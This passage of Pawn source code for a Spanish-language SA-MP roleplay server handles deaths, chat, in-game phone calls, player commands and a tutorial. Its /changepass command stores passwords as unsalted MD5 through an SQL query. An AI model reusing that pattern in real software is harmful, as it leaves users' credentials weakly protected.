				return BanPlayer(playerid, INVALID_PLAYER_ID, "fake kills cheat");
        }
        default: DeathSpam{playerid} = 0;
    }
    
    LastDeath[playerid] = time;
    PlayerInfo[playerid][pArmour] = 0;

    if(PlayerInfo[playerid][pJailed] == 1)
	{
		GetPlayerPos(playerid, PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ]);
    }
    
	if(AdminDuty[playerid] == 1)
	{
		GetPlayerPos(playerid, PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ]);
		return 1;
	}
	if(IsPlayerConnected(killerid) && killerid != INVALID_PLAYER_ID)
	{
	    if(PlayerInfo[killerid][pJailed] == 2)
		{
	        format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} tu condena ha sido aumentada en %d segundos, raz�n: DM.", DM_JAILTIME);
		    SendClientMessage(killerid,COLOR_LIGHTYELLOW2, string);
	        PlayerInfo[killerid][pJailTime] += DM_JAILTIME;
	    }
		else if(killerid != playerid)
		{
            if(PlayerInfo[playerid][pWantedLevel] > 0 && isPlayerCopOnDuty(killerid))
			{
				SendFMessage(killerid, COLOR_WHITE, "Has reducido a %s y ha sido arrestado por miembros del departamento de polic�a.", GetPlayerNameEx(playerid));
				PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pWantedLevel] * 3 * 60;
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Has sido reducido y arrestado por miembros de la polic�a perdiendo todas las armas y drogas en el inventario.");
				format(string, sizeof(string), "[PMA]: %s ha reducido y arrestado al criminal %s (%d minutos).", GetPlayerNameEx(killerid), GetPlayerNameEx(playerid), PlayerInfo[playerid][pJailTime] / 60);
				SendFactionMessage(FAC_PMA, COLOR_PMA, string);
				PlayerInfo[playerid][pJailed] = 1;
				PlayerInfo[playerid][pX] = 193.5868;
				PlayerInfo[playerid][pY] = 175.3084;
				PlayerInfo[playerid][pZ] = 1003.1221;
				PlayerInfo[playerid][pA] = 180.0000;
				
				ResetPlayerWantedLevelEx(playerid);
				ResetAndSaveInv(playerid);
				GiveFactionMoney(FAC_GOB, PlayerInfo[playerid][pJailTime]);
				SaveFactions();
			}
	    }
 	}
 	
	if(PlayerInfo[playerid][pJailed] == 0)
		PlayerInfo[playerid][pHospitalized] = 1;

	// Los policias en servicio que mueren no pierden las armas (no se las confiscan en el hospital)
	if(!isPlayerCopOnDuty(playerid))
	{
	    ResetAndSaveHands(playerid);
		ResetAndSaveBack(playerid);
	}
	EndPlayerDuty(playerid);
	
	if(hearingRadioStream[playerid])
		StopAudioStreamForPlayer(playerid);
		
	OnPlayerLeaveRobberyGroup(playerid, 2);
	
	InEnforcer[playerid] = 0;

	ResetPlayerWeapons(playerid);
	return 1;
}

public OnPlayerText(playerid, text[])
{
	new idx,
		string[128],
		tmp[256];

    if(!gPlayerLogged[playerid]) return 0;

    if(TalkAnimEnabled[playerid] && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
 		ApplyAnimation(playerid, "GANGS", "prtial_gngtlkF", 4.1, 0, 1, 1, 1, 1, 1);
 		ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.0, 1, 1, 1, 1, 1, 1);
 		SetTimerEx("EndAnim", strlen(text) * 200, false, "i", playerid);
	}

	if(Muted[playerid])	{
		SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} no puedes hablar, has sido silenciado.");
		return 0;
	}

	if(usingCamera[playerid]) {
		SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} No puedes hablar mientras estas viendo una c�mara.");
		return 0;
	}

	tmp = strtok(text, idx);

 	if((strcmp("(", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("("))) {
	    if(text[1] != 0) {
            PlayerLocalMessage(playerid, 15.0, text);
	   		return 0;
   		}
	}

	new name[24]; // Para ver si mandar mensajes desde la mascara
	if(usingMask[playerid])
	    format(name, sizeof(name), "Enmascarado %d", maskNumber[playerid]);
	else
	    name = GetPlayerNameEx(playerid);

	if(CheckMissionEvent(playerid, 2, text))
	    return 0;
	if(CheckMissionEvent(playerid, 3, text))
	    return 0;
	    
    //==========================================================================
	if(Mobile[playerid] == 911)
	{
		if((strcmp("policia", text, true, strlen(text)) == 0) && (strlen(text) == strlen("policia")))
		{
		    format(string, sizeof(string), "%s dice por tel�fono: %s", name, text);
			SendClientMessage(playerid, COLOR_FADE1, "Operadora dice: polic�a metropolitana, por favor de un breve informe de lo ocurrido.");
			Mobile[playerid] = 912;
			ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		}
		else if((strcmp("paramedico", text, true, strlen(text)) == 0) && (strlen(text) == strlen("paramedico")))
		{
		    format(string, sizeof(string), "%s dice por tel�fono: %s", name, text);
			SendClientMessage(playerid, COLOR_FADE1, "Operadora dice: departamento de emergencias, por favor de un breve informe de lo ocurrido.");
			Mobile[playerid] = 913;
			ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		}
		else
			SendClientMessage(playerid, COLOR_FADE1, "Operadora dice: no le entiendo solo diga, policia o paramedico.");
		return 0;
	}
	//==========================================================================
	else if(Mobile[playerid] == 912)
	{
		if(!strlen(text))
			SendClientMessage(playerid, COLOR_FADE1, "Operadora dice: disculpe, no le entiendo...");
		else
		{
		    format(string, sizeof(string), "%s dice por tel�fono: %s", name, text);
			ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			SendClientMessage(playerid, COLOR_FADE1, "Operadora dice: gracias, hemos alertado a todas las unidades en el �rea, mantenga la calma.");
            format(string, sizeof(string), "[Llamada al 911 del %d]: %s", PlayerInfo[playerid][pPhoneNumber], text);
			SendFactionMessage(FAC_PMA, COLOR_WHITE, string);
			Mobile[playerid] = 255;
			lastPoliceCallNumber = PlayerInfo[playerid][pPhoneNumber];
			GetPlayerPos(playerid, lastPoliceCallPos[0], lastPoliceCallPos[1], lastPoliceCallPos[2]);
		}
		return 0;
	}
	//==========================================================================
	else if(Mobile[playerid] == 913)
	{
		if(!strlen(text))
			SendClientMessage(playerid, COLOR_FADE1, "Operadora dice: disculpe, no le entiendo...");
		else
		{
			format(string, sizeof(string), "%s dice por tel�fono: %s", name, text);
			ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			SendClientMessage(playerid, COLOR_FADE1, "Operadora dice: gracias, hemos alertado a todas las unidades, mantenga la calma.");
            format(string, sizeof(string), "[Llamada al 911 del %d]: %s", PlayerInfo[playerid][pPhoneNumber], text);
			SendFactionMessage(FAC_HOSP, COLOR_WHITE, string);
			Mobile[playerid] = 255;
			lastMedicCallNumber = PlayerInfo[playerid][pPhoneNumber];
			GetPlayerPos(playerid, lastMedicCallPos[0], lastMedicCallPos[1], lastMedicCallPos[2]);
		}
		return 0;
	}
    //==========================================================================
	else if(Mobile[playerid] == 555)
	{
	    foreach(new i : Player)
		{
	        if(PlayerInfo[i][pFaction] == FAC_MECH && PlayerInfo[i][pJailed] == 0 && jobDuty[i])
			{
	            SendFMessage(i, COLOR_GREEN, "Nuevo mensaje del %d: %s", PlayerInfo[playerid][pPhoneNumber], text);
				SendClientMessage(i, COLOR_WHITE, "Use /aceptar mecanico para aceptar la llamada.");
			}
	    }
		MechanicCall = playerid;
		Mobile[playerid] = 255;
		format(string, sizeof(string), "%s dice por tel�fono: %s", name, text);
		ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
	    SendClientMessage(playerid,COLOR_WHITE,"Telefonista: un mec�nico deber�a llegar a su posici�n en un momento, adi�s.");
		return 0;
	}
	//==========================================================================
	else if(Mobile[playerid] == 444)
	{
	    foreach(new i : Player)
		{
	        if(PlayerInfo[i][pJob] == JOB_TAXI && PlayerInfo[i][pJailed] == 0 && jobDuty[i])
			{
	            SendClientMessage(i,COLOR_GREEN,"Se ha recibido un mensaje:");
				format(string,sizeof(string),"Voz al telefono: %s", text);
				SendClientMessage(i,COLOR_WHITE,string);
				SendClientMessage(i,COLOR_WHITE,"Use /aceptar taxi para aceptar la llamada.");
				SendClientMessage(playerid,COLOR_WHITE,"Telefonista: enviaremos un veh�culo a su posici�n, por favor aguarde.");
				TaxiCall = playerid;
				Mobile[playerid] = 255;
			}
	    }
		return 0;
	}
    //==========================================================================
	else if(Mobile[playerid] != 255)
	{
		format(string, sizeof(string), "%s dice por tel�fono: %s", name, text);
		ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		if(IsPlayerConnected(Mobile[playerid]))
		{
		    format(string, sizeof(string), "[Voz al tel�fono]: %s", text);
		    if(Mobile[Mobile[playerid]] == playerid)
				SendClientMessage(Mobile[playerid], COLOR_WHITE, string);
		} else
			SendClientMessage(playerid, COLOR_LIGHTYELLOW2,"{FF4600}[Error]:{C8C8C8} no hay nadie en la l�nea.");
		format(string, sizeof(string), "[IC-TELE] %s a %s (DBID: %d) : %s", GetPlayerNameEx(playerid), GetPlayerNameEx(Mobile[playerid]), PlayerInfo[Mobile[playerid]][pID], text);
		log(playerid, LOG_CHAT, string);
		return 0;
	}
	//==========================================================================
	
    if(!IsPlayerInAnyVehicle(playerid) || GetVehicleType(GetPlayerVehicleID(playerid)) != VTYPE_CAR)
	{
        format(string, sizeof(string), "%s dice: %s", name, text);
		ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		format(string, sizeof(string), "[IC-LOCAL] %s: %s", GetPlayerNameEx(playerid), text);
		log(playerid, LOG_CHAT, string);
	}
	else
	{
	    if(CarWindowStatus[GetPlayerVehicleID(playerid)] == 1)
		{
	        format(string, sizeof(string), "[Ventanillas cerradas] %s dice: %s", name, text);
			ProxDetector(5.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		}
		else
		{
		    format(string, sizeof(string), "[Ventanillas abiertas] %s dice: %s", name, text);
			ProxDetector(15.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		}
		format(string, sizeof(string), "[IC-LOCAL] %s: %s", GetPlayerNameEx(playerid), text);
		log(playerid, LOG_CHAT, string);
	}
    return 0;
}

public OnPlayerPrivmsg(playerid, recieverid, text[])
{
	new string[128];
	
	if(!PMsEnabled[recieverid] && !AdminDuty[playerid])
		return SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"{FF4600}[Error]:{C8C8C8} el usuario ha bloqueado los susurros.");

	foreach(new i : Player)	{
		if(GetPVarInt(i, "pms") == 1)
			SendFMessage(i, 0x00D67FFF, "[OOC]: MP de %s(%d) a %s(%d): %s", GetPlayerNameEx(playerid),playerid,GetPlayerNameEx(recieverid),recieverid, text);
	}
	SendFMessage(recieverid, COLOR_MEDIUMBLUE, "[OOC]: MP de %s(%d): %s", GetPlayerNameEx(playerid),playerid, text);
	SendFMessage(playerid, COLOR_MEDIUMBLUE, "[OOC]: MP a %s(%d): %s", GetPlayerNameEx(recieverid),recieverid, text);
	log(playerid, LOG_CHAT, string);
	return 0;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success) {
	new string[128];
	new cmd[256];
	new idx;
	cmd = strtok(cmdtext, idx);
	new tmp[256];

	if(gPlayerLogged[playerid] == 1)
	{
		//==========================================================================================================================
		if(strcmp(cmdtext,"/sinfo",true)==0)
		{

			new form[128];
			SendClientMessage(playerid, COLOR_WHITE,"Server Statistics:");
			format(form, sizeof form, "{878EE7}[INFO]:{C8C8C8} Total Objects: %d.", GetObjectCount());
			SendClientMessage(playerid, COLOR_LIGHTYELLOW2,form);
			format(form, sizeof form, "{878EE7}[INFO]:{C8C8C8} Total Vehicles: %d.", GetVehicleCount());
			SendClientMessage(playerid, COLOR_LIGHTYELLOW2,form);
			//format(form, sizeof form, "{878EE7}[INFO]:{C8C8C8} Total Pickups: %d.", CountStreamPickups());
			//SendClientMessage(playerid, COLOR_LIGHTYELLOW2,form);
				
			return 1;
		}
	//--------------------------------------------------------------------------------------------------------------------------
	//=====================================================================================================================
		if(strcmp(cmd,"/toggle",true)==0)
		{
	 	if(IsPlayerConnected(playerid))
	 	{
			new x_info[128];
			x_info = strtok(cmdtext, idx);
			if(!strlen(x_info))
			{
				SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /toggle [mps - telefono - noticias - faccion - radio - nicks - hud]");
				return 1;
			}
	  		else if(strcmp(x_info,"mps",true) == 0)
			{
				if(PMsEnabled[playerid])
				{
				    SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ya no recibir�s mensajes privados.");
				    PMsEnabled[playerid] = false;
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ahora recibir�s mensajes privados.");
				    PMsEnabled[playerid] = true;
				}
			}
 	  		else if(strcmp(x_info,"nicks",true) == 0)
			{
				if(NicksEnabled[playerid])
				{
				    SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ya no veras los nicks de los demas jugadores sobre sus cabezas.");
				    NicksEnabled[playerid] = false;
				    foreach(new i : Player)
				    	ShowPlayerNameTagForPlayer(playerid, i, false);
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ahora veras los nicks de los demas jugadores sobre sus cabezas.");
				    NicksEnabled[playerid] = true;
				    foreach(new i : Player)
				    {
				        if(usingMask[i] == false || PlayerInfo[playerid][pAdmin])
				    		ShowPlayerNameTagForPlayer(playerid, i, true);
					}
				}
			}
	  		else if(strcmp(x_info,"noticias",true) == 0)
			{
				if(NewsEnabled[playerid])
				{
				    SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ya no recibir�s noticias de CTR-MAN.");
				    NewsEnabled[playerid] = false;
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ahora recibir�s noticias de CTR-MAN.");
				    NewsEnabled[playerid] = true;
				}
			}
 			else if(strcmp(x_info,"faccion",true) == 0)
			{
				if(FactionEnabled[playerid])
				{
				    SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ya no recibir�s mensajes OOC de tu facci�n.");
				    FactionEnabled[playerid] = false;
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ahora recibir�s mensajes OOC de tu facci�n.");
				    FactionEnabled[playerid] = true;
				}
			}
 			else if(strcmp(x_info,"radio",true) == 0)
			{
				if(RadioEnabled[playerid])
				{
				    SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Has apagado tu radio.");
				    RadioEnabled[playerid] = false;
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Has encendido tu radio.");
				    RadioEnabled[playerid] = true;
				}
			}
 			else if(strcmp(x_info,"hud",true) == 0)
			{
				if(HudEnabled[playerid])
				{
				    SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ya no ver�s las interfaces gr�ficas del combustible, velocidad, hambre, etc.");
				    HudEnabled[playerid] = false;
				    HidePlayerSpeedo(playerid);
					HidePlayerBasicNeeds(playerid);
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Ahora ver�s nuevamente las interfaces gr�ficas del combustible, velocidad, hambre, etc.");
				    HudEnabled[playerid] = true;
				    ShowPlayerSpeedo(playerid);
				    ShowPlayerBasicNeeds(playerid);
				}
			}
	  		else if(strcmp(x_info,"telefono",true) == 0)
			{
				if(PhoneEnabled[playerid])
				{
				    SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Has apagado tu tel�fono.");
		            PhoneEnabled[playerid] = false;
				}
				else
				{
					SendClientMessage(playerid,COLOR_LIGHTYELLOW2, "Has encedido tu tel�fono.");
				    PhoneEnabled[playerid] = true;
				}
			}
		}
		return 1;
		}
		if(strcmp(cmd, "/togglegooc", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				if(OOCStatus)
				{
					OOCStatus = 0;
					format(string, sizeof(string), "[OOC Global]: desactivado por %s.", GetPlayerNameEx(playerid));
					SendClientMessageToAll(COLOR_ADMINCMD, string);
				}
				else
				{
					OOCStatus = 1;
					format(string, sizeof(string), "[OOC Global]: activado por %s.", GetPlayerNameEx(playerid));
					SendClientMessageToAll(COLOR_ADMINCMD, string);
				}
			}
			return 1;
		}
	 	if(strcmp(cmd, "/id", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /id [ID/Jugador]");
					return 1;
				}
				new target;
				target = ReturnUser(tmp);
				new sstring[70];
				if(IsPlayerConnected(target))
				{
				    if(target != INVALID_PLAYER_ID)
				    {
						format(sstring, sizeof(sstring), "{878EE7}[INFO]:{C8C8C8} Nombre: %s (ID: %d).",GetPlayerNameEx(target),target);
						SendClientMessage(playerid, COLOR_LIGHTYELLOW2, sstring);
					}
				}
			}
			return 1;
		}
		if(strcmp(cmd, "/ppvehiculos", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /ppvehiculos [porcentaje del precio]");
					return 1;
				}
				new perc = strval(tmp);

				if(perc <= 1000 && perc >= 1)
				{
					ServerInfo[sVehiclePricePercent] = perc;
					format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} el porcentaje de costo de los veh�culos ha sido ajustado a %d por ciento.", perc);
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} el porcentaje no puede ser menor a 1 o mayor a 1000.");
				}
			}
			return 1;
		}
		if(strcmp(cmd, "/admins", true) == 0)
		{
	        if(IsPlayerConnected(playerid))
		    {
		        new count = 0;
				SendClientMessage(playerid, COLOR_LIGHTGREEN, "====================[ADMINISTRADORES EN SERVICIO]===================");
				foreach(new i : Player) {
				    if(PlayerInfo[i][pAdmin] >= 1 && AdminDuty[i] == 1) {
						format(string, 256, "Administrador: %s", GetPlayerNameEx(i));
						SendClientMessage(playerid, COLOR_WHITE, string);
						count++;
					}
				}
				if(count == 0)
				{
					SendClientMessage(playerid,COLOR_WHITE,"{878EE7}[INFO]:{C8C8C8} No hay administradores en servicio.");
				}
            	SendClientMessage(playerid, COLOR_LIGHTGREEN, "===================================================================");
			}
			return 1;
		}
	 	if(strcmp(cmd, "/changepass", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				if (gPlayerLogged[playerid])
				{
					new length = strlen(cmdtext);
					while ((idx < length) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offset = idx;
					new result[128];
					while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
					{
						result[idx - offset] = cmdtext[idx];
						idx++;
					}
					result[idx - offset] = EOS;
					if(!strlen(result))
					{
						SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /changepass [nueva contrase�a]");
						return 1;
					}
					mysql_real_escape_string(result, result,1,sizeof(result));
		   			strmid(PlayerInfo[playerid][pKey], (result), 0, strlen((result)), 128);
					format(string, sizeof(string), "{878EE7}[INFO]:{C8C8C8} has cambiado tu contrase�a.");
					SendClientMessage(playerid, COLOR_ADMINCMD, string);
                    format(string, sizeof(string), "UPDATE accounts SET Password=MD5('%s') WHERE Id=%d;", result, PlayerInfo[playerid][pID]);
					mysql_function_query(dbHandle, string, false, "", "");
				}
			}
			return 1;
		}
	 	if(strcmp(cmd, "/do", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[128];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /do [acci�n]");
					return 1;
				}
				new form[128];
				format(form, sizeof(form), "%s", result);
				PlayerDoMessage(playerid, 15.0, form);
			}
			return 1;
		}
		if(strcmp(cmd, "/stats", true) == 0)
		{
			ShowStats(playerid,playerid, false);
			return 1;
		}
		if(strcmp(cmd, "/aeconomia", true) == 0)
		{
			SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"[Nivel 20]: /ppvehiculos");
			return 1;
		}
	 	if(strcmp(cmd, "/up", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+2);
				return 1;
			}
			return 1;
		}
	 	if(strcmp(cmd, "/gametext", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[64];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /gametext [textformat ~n~=Newline ~r~=Red ~g~=Green ~b~=Blue ~w~=White ~y~=Yellow]");
					return 1;
				}
				format(string, sizeof(string), "~b~%s: ~w~%s",GetPlayerNameEx(playerid),result);
				foreach(new i : Player)
				{
					GameTextForPlayer(i, string, 5000, 6);
				}
				return 1;
			}
			return 1;
		}
		if(strcmp(cmd, "/unknowngametext", true) == 0)
		{
		    if(IsPlayerConnected(playerid))
		    {
				tmp = strtok(cmdtext, idx);
				new txtid;
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /unknowngametext ");
					return 1;
				}
				txtid = strval(tmp);
				if(txtid == 2)
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ");
					return 1;
				}
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[128];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /unknowngametext <type> [cnnc textformat ~n~=Newline ~r~=Red ~g~=Green ~b~=Blue ~w~=White ~y~=Yellow]");
					return 1;
				}
				format(string, sizeof(string), "~w~%s",result);
				foreach(new i : Player)
				{

						GameTextForPlayer(i, string, 5000, txtid);

				}
				return 1;
			}
			return 1;
		}
	}
	else
	{
		return 1;
	}
	/*if(success == 0)
	{
		SendClientMessage(playerid,COLOR_LIGHTBLUE,"{878EE7}[INFO]:{C8C8C8} comando inv�lido, escribe /ayuda para ver una lista con los mismos.");
	}*/
	return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[]) {
    new comm[256];
	new idx;
    comm = strtok(cmdtext, idx);

    if(checkCmdPermission(comm,PlayerInfo[playerid][pAdmin])==0)
    {
        SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} No tienes acceso a este comando");
        return 0;
    }
    
	if(usingCamera[playerid] && strcmp(cmdtext,"/salircam")!=0)
	{
		SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} Para utilizar un comando antes debes salir de la c�mara.");
	    return 0;
	}
    return 1;
}

forward tutorial(playerid, step);
public tutorial(playerid, step) {
	for(new i = 0; i < 7; i++) {
	    PlayerTextDrawShow(playerid, TutTD_Text[playerid][i]);
	    PlayerTextDrawSetString(playerid, TutTD_Text[playerid][i], " ");
	}
	TextDrawShowForPlayer(playerid, TutTDBackground);
	
	switch(step) {
	    case 1: {
	        for(new i = 0; i < 32; i++) {
	            SendClientMessage(playerid, COLOR_WHITE, " ");
	        }
			
	    	SetPlayerCameraPos(playerid, 1466.869506, -1575.771972, 109.123466);
			SetPlayerCameraLookAt(playerid, 1470.403442, -1574.002441, 109.740196);
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~b~~h~~h~Bienvenido a Malos Aires RolePlay");
            PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~w~El breve tutorial a continuacion te guiara por los conceptos basicos del RolePlay.");
            PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~w~Al finalizar deberas responder con verdadero o falso una serie de preguntas para asegurarnos que lo hayas entendido correctamente.");
			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 2: {
			InterpolateCameraPos(playerid, 1466.869506, -1575.771972, 109.123466, 1481.400268, -1576.889038, 90.823272, 3000, 1);
			InterpolateCameraLookAt(playerid, 1470.403442, -1574.002441, 109.740196, 1481.267700, -1580.246704, 88.653373, 3000, 1);

			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~b~~h~~h~Concepto de RolePlay:~w~ MARP es un servidor basado en la ciudad ficticia de Malos Aires. Dentro");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~w~de un juego de rol tu personaje debe actuar como lo haria un humano en la vida real, es decir, se debe");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~w~comportar como una persona comun y corriente que vive dentro de un mundo PARALELO.");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][3], "~w~Recuerda los siguientes terminos:");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][4], "~b~~h~~h~OOC:~w~ fuera del personaje en ingles (/b, /gooc).");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][5], "~b~~h~~h~IC:~w~ dentro del personaje (local, /gritar).");
					
			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
		case 3: {
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~b~~h~~h~Normas basicas a respetar:");
            PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~w~Lo siguiente esta prohibido y sera sancionado dentro del servidor.");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][2], "~b~~h~~h~MetaGaming [MG]:~w~ utilizar informacion ~b~OOC~w~ dentro de un canal ~b~IC~w~.");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][3], "~w~Ejemplo: nombrar a otro personaje solo con verle el tag encima de su cabeza en vez de preguntarselo.");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][4], "~b~~h~~h~DeathMatch [DM]:~w~ agredir fisicamente a otro personaje sin ninguna razon rolera.");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][5], "~b~~h~~h~PowerGaming [PG]:~w~ realizar hazanas imposibles, como arrojarse de un precipicio y salir ileso o");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][6], "~w~forzar el rol de otro personaje. Es posible caer de dicho precipicio si el hecho es roleado correctamente.");
			PlayerTextDrawSetString(playerid, TutTD_Text[playerid][7], "~w~Si ves a otra persona incumpliendo con las normas utiliza ~b~~h~~h~~h~~h~/reportar");

			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 4: {
	        PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~w~En la ciudad de Malos Aires, hay una gran cantidad de empleos y roles disponibles. Como por ejemplo...");
	    	SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 5: {
	    	InterpolateCameraPos(playerid, 1481.400268, -1576.889038, 90.823272, 1494.139770, -1643.703613, 60.716976, 3000, 1);
			InterpolateCameraLookAt(playerid, 1481.267700, -1580.246704, 88.653373, 1497.297119, -1644.638916, 58.446140, 3000, 1);
	    
	        PlayerTextDrawSetString(playerid, TutTD_Text[playerid][0], "~w~En la ciudad de Malos Aires, hay una gran cantidad de empleos y roles disponibles. Como por ejemplo...");
	        PlayerTextDrawSetString(playerid, TutTD_Text[playerid][1], "~b~~h~~h~ - oficial de policia");

			SetPVarInt(playerid, "tutTimer", SetTimerEx("tutorial", 15000, false, "ii", playerid, step + 1));
	    }
	    case 6: {
	    	InterpolateCameraPos(playerid, 1494.139770, -1643.703613, 60.716976, 1288.580200, -1241.240356, 95.973281, 3000, CAMERA_CUT);
			InterpolateCameraLookAt(playerid, 1497.297119, -1644.638916, 58.446140, 1285.706665, -1243.337768, 94.144744, 3000, CAMERA_CUT);
			InterpolateCameraPos(playerid, 1288.580200, -1241.240356, 95.973281, 1211.487670, -1293.440307, 27.860240, 3000, 1);
			InterpolateCameraLookAt(playerid, 1285.706665, -1243.337768, 94.144744, 1208.612304, -1295.868041, 26.504356, 3000, 1);
			
